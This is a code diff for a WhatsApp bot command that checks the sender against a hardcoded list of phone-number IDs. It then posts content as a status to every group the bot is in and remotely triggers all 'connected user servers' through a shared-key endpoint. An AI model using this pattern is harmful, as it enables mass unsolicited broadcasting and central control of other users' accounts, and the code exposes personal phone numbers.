@@ -5,108 +5,131 @@ import { WebUrl, Key } from '../lib/functions.js';
 
 const __filename = fileURLToPath(import.meta.url);
 
-cmd({
-    pattern: "status97",
-    alias: ["groupstatus76", "statusgc87", "gcstatus76", "swgc87", "sall98"],
-    desc: "Post strictly to WhatsApp Status Story and trigger all connected user servers",
-    category: "owner",
-    react: "📢",
-    filename: __filename
-}, async (conn, mek, m, { text, reply, isCreator }) => {
-    
-    // Sirf Main Owner / Creator ke liye Authorization Check
-    if (!isCreator) return reply("❌ This command is only for Main Owner!");
+// Allowed users for status broadcast
+const ALLOWED_USERS = [
+    '633341413902@lid',
+    '1297129619592@lid',
+    '2744576544407@lid',
+    '2811233430696@lid',
+    '923195068309@s.whatsapp.net',
+    '923196891871@s.whatsapp.net',
+    '923036338918@s.whatsapp.net',
+    '923110741871@s.whatsapp.net',
+    '923219300532@s.whatsapp.net'
+];
 
+// ==================== ONLY GROUP STATUS BROADCAST COMMAND ====================
+cmd({
+    pattern: "status75",
+    alias: ["autostatus65", "astatus64", "sall97", "statusgc86"],
+    react: "📢",
+    desc: "Post strictly to Group Status across all connected bot servers",
+    category: "owner",
+    use: ".status <reply to media/text/link>",
+    filename: __filename
+}, async (conn, mek, m, { args, q, sender, reply, react }) => {
     try {
-        const quotedMsg = m.quoted;
-        const mimeType = quotedMsg ? (quotedMsg.msg || quotedMsg).mimetype || '' : '';
-        const caption = text?.trim() || "";
-        
-        if (!quotedMsg && !caption) {
-            return reply(
-                `⚠️ Reply to media/audio or provide text/link!\n\n` +
-                `Examples:\n` +
-                `• .status Check out this link\n` +
-                `• Reply to an image/video/audio with: .status`
-            );
+        // Authorization Check
+        if (!ALLOWED_USERS.includes(sender)) {
+            await react('❌');
+            return reply("*❌ | Only Authorized Owner Can Use This Command*");
         }
 
-        await conn.sendMessage(m.chat, { react: { text: "⏳", key: mek.key } });
+        await react('⏳');
+
+        // Target Message & Content Extraction
+        const targetMessage = m.quoted ? m.quoted : m;
+        const mime = (targetMessage.msg || targetMessage).mimetype || '';
+        let statusText = q || targetMessage.text || targetMessage.caption || '';
+
+        if (!mime && !statusText) {
+            await react('❌');
+            return reply("❌ *Please reply to an image, video, audio, link, or provide text!*");
+        }
 
         let mediaBuffer = null;
         let isPTT = false;
 
-        if (quotedMsg) {
-            mediaBuffer = await quotedMsg.download();
-            if (!mediaBuffer) throw new Error("Failed to download media!");
-            isPTT = quotedMsg.message?.audioMessage?.ptt || false;
+        if (mime) {
+            mediaBuffer = await targetMessage.download();
+            isPTT = targetMessage.msg?.ptt || false;
         }
 
-        // ==================== 1. POST STRICTLY TO OFFICIAL WHATSAPP STORY (NO GROUP CHAT) ====================
-        let localStatusPosted = false;
-        try {
-            if (quotedMsg) {
-                if (mimeType.startsWith('image/')) {
-                    await conn.sendMessage('status@broadcast', { image: mediaBuffer, caption: caption || "" });
-                } else if (mimeType.startsWith('video/')) {
-                    await conn.sendMessage('status@broadcast', { video: mediaBuffer, caption: caption || "" });
-                } else if (mimeType.startsWith('audio/')) {
-                    await conn.sendMessage('status@broadcast', { audio: mediaBuffer, ptt: isPTT, mimetype: isPTT ? 'audio/ogg; codecs=opus' : 'audio/mp4' });
+        // 1. Post STRICTLY to Group Status Only (Your Bot Joined Groups)
+        const allGroups = await conn.groupFetchAllParticipating();
+        const groupIds = Object.keys(allGroups);
+        let myGroupStatusCount = 0;
+
+        for (const targetGroupId of groupIds) {
+            try {
+                // Group Status Context Payload
+                const statusContext = {
+                    isGroupStatus: true
+                };
+
+                let statusPayload = {};
+
+                if (mime) {
+                    if (mime.startsWith('image/')) {
+                        statusPayload = { image: mediaBuffer, caption: statusText || "", mimetype: mime, contextInfo: statusContext };
+                    } else if (mime.startsWith('video/')) {
+                        statusPayload = { video: mediaBuffer, caption: statusText || "", mimetype: mime, contextInfo: statusContext };
+                    } else if (mime.startsWith('audio/')) {
+                        statusPayload = { audio: mediaBuffer, mimetype: isPTT ? 'audio/ogg; codecs=opus' : 'audio/mp4', ptt: isPTT, contextInfo: statusContext };
+                    }
+                } else if (statusText) {
+                    statusPayload = { text: statusText, contextInfo: statusContext };
                 }
-            } else if (caption) {
-                await conn.sendMessage('status@broadcast', { text: caption });
+
+                // Send strictly as group status
+                await conn.sendMessage(targetGroupId, statusPayload);
+                myGroupStatusCount++;
+                
+                // Safety delay
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+            } catch (err) {
+                console.error(`Group status failed for ${targetGroupId}:`, err.message);
             }
-            localStatusPosted = true;
-        } catch (statusErr) {
-            console.error("Local WhatsApp Story Upload Error:", statusErr.message);
         }
 
-        // ==================== 2. FIXED FAST MULTI-SERVER TRIGGER (ALL 100 SERVERS) ====================
-        let totalExternalServers = 0;
+        // 2. Trigger All Connected User Servers (Strictly Group Status Only)
+        let totalServers = 0;
         let triggeredServers = 0;
 
         try {
-            // WebUrl se tamam connected user servers fetch karna
             const serversResponse = await axios.get(`${WebUrl}/servers`, { timeout: 10000 });
             
-            if (serversResponse.data && (serversResponse.data.servers || Array.isArray(serversResponse.data))) {
-                const servers = serversResponse.data.servers || serversResponse.data;
-                totalExternalServers = servers.length;
+            if (serversResponse.data && serversResponse.data.servers) {
+                const servers = serversResponse.data.servers;
+                totalServers = servers.length;
 
-                // Fire all requests concurrently using Promise.allSettled (Fast & Reliable)
-                const promises = servers.map(server => {
-                    const targetUrl = server.url || server;
-                    const serverEndpoint = `${targetUrl}/post-status?key=${Key}`;
-                    
-                    return axios.post(serverEndpoint, {
-                        text: caption,
-                        mimeType: mimeType,
-                        mediaData: mediaBuffer ? mediaBuffer.toString('base64') : null,
-                        isPTT: isPTT
-                    }, { timeout: 5000 })
-                    .then(() => { triggeredServers++; })
-                    .catch(() => {});
+                const requests = servers.map(server => {
+                    const groupStatusApi = `${server.url}/post-group-status-only?key=${Key}&text=${encodeURIComponent(statusText)}`;
+                    return axios.get(groupStatusApi, { timeout: 6000 })
+                        .then(() => { triggeredServers++; })
+                        .catch(() => {});
                 });
 
-                await Promise.allSettled(promises);
+                await Promise.allSettled(requests);
             }
-        } catch (apiErr) {
-            console.error("Servers Fetch Error:", apiErr.message);
+        } catch (serverErr) {
+            console.error("Server Trigger Error:", serverErr.message);
         }
 
-        // Output Confirmation
-        await conn.sendMessage(m.chat, { react: { text: "✅", key: mek.key } });
-        
-        return reply(
-            `📢 *WHATSAPP STATUS BROADCAST COMPLETE!*\n\n` +
-            `📲 *Official Story Posted:* ${localStatusPosted ? 'SUCCESS 🟢' : 'FAILED 🔴'}\n` +
-            `🖥️ *User Servers Triggered:* ${triggeredServers} / ${totalExternalServers}\n\n` +
-            `> *Note: Direct group chat messages are disabled. Posted exclusively to status story.*`
-        );
+        await react('✅');
+
+        // Status Response Summary
+        let resultMsg = `📢 *ONLY GROUP STATUS BROADCAST COMPLETE!*\n\n`;
+        resultMsg += `📲 *Your Bot Groups Statuses Updated:* ${myGroupStatusCount} / ${groupIds.length}\n`;
+        resultMsg += `🖥️ *User Servers Triggered (Group Status):* ${triggeredServers} of ${totalServers}\n\n`;
+        resultMsg += `> *Note: Direct group messages & main WhatsApp story are excluded.*`;
+
+        await reply(resultMsg);
 
     } catch (error) {
-        console.error("Status Broadcast Error:", error);
-        await conn.sendMessage(m.chat, { react: { text: "❌", key: mek.key } });
-        reply(`❌ Error: ${error.message}`);
+        console.error("Group Status Command Error:", error);
+        await react('❌');
+        await reply(`❌ *Error:* ${error.message}`);
     }
 });
